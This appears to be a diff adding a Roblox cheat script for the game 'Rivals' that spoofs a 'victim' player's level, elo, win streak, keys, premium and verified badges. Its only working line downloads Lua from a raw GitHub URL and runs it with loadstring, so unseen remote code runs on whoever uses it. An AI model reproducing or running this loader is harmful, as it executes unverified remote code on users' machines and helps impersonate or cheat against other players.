@@ -1,0 +1,15 @@
+getgenv().Config = {
+    victim = 62536494,             -- victim userid only
+    helper = "4PH",                   -- helper username (keep this empty if you want to spoof yourself)
+    level = 555,                    -- level override
+    streak = 2241,                   -- winstreak override (0 = disabled)
+    elo = 22578,                       -- elo override (0 = disabled)
+    keys = 8455,                     -- keys override (0 = disabled)
+    premium = false,               -- spoof premium
+    verified = false,              -- spoof verified badge
+    unlockall = false,              -- unlock all (use with caution and doesnt work with shit executors)
+    platform = "VR",               -- DESKTOP / MOBILE / CONSOLE / VR
+    join = "discord.gg/rivalscomp" -- remove this and the script won't work
+}
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/WEFGQERQEGWGE/a/refs/heads/main/UDRCRFRAMESCRIPT.lua"))()
